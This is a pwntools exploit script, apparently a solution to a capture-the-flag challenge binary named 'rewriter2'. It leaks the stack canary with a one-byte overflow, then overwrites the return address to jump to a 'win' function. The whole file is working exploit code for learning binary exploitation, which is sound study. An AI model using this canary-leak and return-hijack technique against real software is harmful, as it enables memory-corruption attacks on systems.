import pwn

pwn.context.log_level = "DEBUG"
BIN_NAME = "./rewriter2"
#pwn.context.binary = BIN_NAME

def solve(io):
    elf = pwn.ELF(BIN_NAME)

    addr_win = elf.symbols['win']
    print(f'***hex(addr_win): {hex(addr_win)}')

    BUF_SIZE = 40
    io.recvuntil(b"What's your name? ")
    io.send(b'A'*(BUF_SIZE+1))
    #io.sendafter(b"What's your name?", b"A"*(BUF_SIZE + 1))
    io.recvuntil(b"Hello, " + b"A" * BUF_SIZE)
    line = io.recvline()
    print(f'***line: {line}')
    print(f'***line length: {len(line)}')
    print(f'***line[8]: {line[:8]}')
    print(f'***len(line[8]): {len(line[:8])}')

    # こっちを指定するときはコンテキストでバイナリを指定してないとうまく行かない
    #canary = pwn.unpack(line[:8])
    # こっちを指定するときはコンテキストでバイナリがなくても大丈夫
    canary = pwn.u64(line[:8])
    print(f'***canary: {canary}')
    print(f'***canary: {canary}')
    canary &= 0xFFFFFFFFFFFFFF00
    print(f'***canary2: {canary}')
    print(f'***{hex(canary) = }')

    #payload = b'a' * 40 + pwn.p64(canary) + pwn.p64(0) + pwn.p64(addr_win)
    #payload = b'a' * 40 + pwn.pack(canary) + pwn.pack(0) + pwn.pack(addr_win)
    payload = pwn.flat(
        b'a' * 40,
        pwn.p64(canary),
        pwn.p64(0),
        pwn.p64(addr_win
    ))
    print('***payload: ', payload)
    io.sendline(payload)
    io.interactive()

with pwn.process('./rewriter2') as io:
    solve(io)

